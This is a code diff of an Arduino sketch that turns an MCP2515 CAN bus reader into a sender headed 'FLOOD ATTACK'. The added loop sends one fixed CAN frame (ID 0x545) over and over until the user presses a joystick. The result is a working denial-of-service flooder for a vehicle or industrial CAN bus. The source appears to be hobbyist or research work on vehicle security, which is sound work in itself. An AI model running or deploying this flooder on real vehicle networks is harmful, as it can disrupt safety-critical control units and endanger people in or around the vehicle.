@@ -1,13 +1,13 @@
 /****************************************************************************
-                  (MCP2515) CAN Bus Reader
+                  (MCP2515) CAN Bus Sender - FLOOD ATTACK
                     
 Author: Samuel De La Motte
 Contact: samuel.delamotte1@gmail.com
 Date: 26/05/2020
-Version: 1.2
+Version: 1.0
 
-Based off the Arduino script found at the following link:
-https://github.com/alexandreblin/arduino-can-reader
+Based off the Arduino tutorial found at the following link:
+https://www.instructables.com/id/Hack-your-vehicle-CAN-BUS-with-Arduino-and-Seeed-C/
 *****************************************************************************/
 //*******************************LIBRARIES**********************************//
 #include <SPI.h>
@@ -27,6 +27,12 @@ https://github.com/alexandreblin/arduino-can-reader
 #define LED2 8
 #define LED3 7
 
+//************************CAN MESSAGE CONFIGURATION*************************//
+// CAN message ID (in HEX), payload and length
+unsigned long ID = 0x545;  // 1349
+unsigned long LENGTH = 8;
+unsigned char PAYLOAD[8] = {0, 1, 2, 3, 4, 5, 6, 7};
+
 //*******************************CONSTANTS**********************************//
 // Initialise chip select pins
 const int CAN_CS_PIN = 10; // MCP2515 pin
@@ -45,10 +51,7 @@ const int CAN_CS_PIN = 10; // MCP2515 pin
 //********************************GLOBALS***********************************//
 // CAN Object
 MCP_CAN CAN(CAN_CS_PIN);
-
-// CAN data
-unsigned char len = 0;
-byte buffer[8];
+int count = 0;
 
 //*******************************SETUP LOOP*********************************//
 void setup() {
@@ -82,16 +85,25 @@ void setup() {
     Serial.println("[ERROR] - CAN'T INITIALISE CAN");
     delay(100);
   }
-
-  // CAN reader
-  Serial.println("[INFO] - SYSTEM READY");
-  Serial.println("[PAUSED] - Press the joystick to begin.");
-
-  // Wait for user to click joystick to begin logging
-  while (digitalRead(CLICK)==HIGH) {
-    // Waiting...
-  }
   
+  // CAN sender is ready
+  Serial.println("[INFO] - SYSTEM READY");
+}
+
+//********************************MAIN LOOP*********************************//
+void loop() {
+START:
+  // Pause the program to wait for the user to press the joystick
+  count = 0;
+  delay(1000);
+  while (digitalRead(CLICK)==HIGH) {
+      // Wait again for joystick press
+      if (count == 0) {
+        Serial.println("[PAUSED] - Press the joystick to begin.");
+        count = 1;
+      }
+  }
+
   Serial.println("[INFO] - SYSTEM STARTING...");
   Serial.println("3");
   delay(1000);
@@ -99,38 +111,18 @@ void setup() {
   delay(1000);
   Serial.println("1");
   delay(1000);
-}
 
-//********************************MAIN LOOP*********************************//
-void loop() {
+  // Sending the CAN message
   while (digitalRead(CLICK)==HIGH) {
-    if (CAN.checkReceive() == CAN_MSGAVAIL) {
-      // Turn on LED to indicate CAN Bus traffic
-      digitalWrite(LED3, HIGH);
-      
-      // Get CAN message
-      CAN.readMsgBuf(&len, buffer);
-
-      // Print CAN ID and LEN
-      Serial.print(CAN.getCanId());
-      Serial.print(",");
-      Serial.print(len);
-
-      // Print CAN data
-      char tmp[3];
-      for(int i = 0; i<len; i++) {
-        Serial.print(",");
-        snprintf(tmp, 3, "%02X", buffer[i]);
-        Serial.print(tmp);
-      }
-      Serial.println();
-    }
+    // Turn on LED to indicate CAN Bus traffic
+    digitalWrite(LED3, HIGH);
+    
+    // Send CAN message
+    CAN.sendMsgBuf(ID,0,LENGTH,PAYLOAD); // 0 means standard frame length, 1 is extended
     
     // Turn off LED3
     digitalWrite(LED3, LOW);
   }
-  // User pressed the joystick again to stop logging
-  while (1) {
-    // Stopped...
-  }
+  // User pressed the joystick again, stop sending can message
+  goto START;
 }
